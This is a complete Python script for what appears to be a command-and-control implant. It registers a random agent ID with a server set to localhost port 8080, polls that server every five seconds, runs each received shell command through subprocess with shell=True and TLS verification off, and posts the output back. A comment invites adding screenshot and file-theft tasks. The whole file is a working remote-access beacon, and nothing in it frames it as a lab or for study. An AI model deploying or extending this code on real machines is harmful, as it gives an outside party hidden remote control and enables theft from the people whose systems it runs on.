import uuid
import time
import requests
import platform
import subprocess

SERVER = "http://127.0.0.1:8080"
AGENT_ID = str(uuid.uuid4())

def register():
    requests.post(f"{SERVER}/register", json={"agent_id": AGENT_ID}, verify=False)

def get_tasks():
    resp = requests.get(f"{SERVER}/task/{AGENT_ID}", verify=False)
    return resp.json().get('tasks', [])

def send_result(result):
    requests.post(f"{SERVER}/result/{AGENT_ID}", json=result, verify=False)

def execute_task(task):
    if task['type'] == 'shell':
        try:
            output = subprocess.check_output(task['command'], shell=True, stderr=subprocess.STDOUT, timeout=10)
            send_result({'task': task, 'output': output.decode()})
        except Exception as e:
            send_result({'task': task, 'output': str(e)})
    # Add more task types (screenshot, file, etc.) here

def main():
    register()
    while True:
        tasks = get_tasks()
        for task in tasks:
            execute_task(task)
        time.sleep(5)

if __name__ == '__main__':
    main()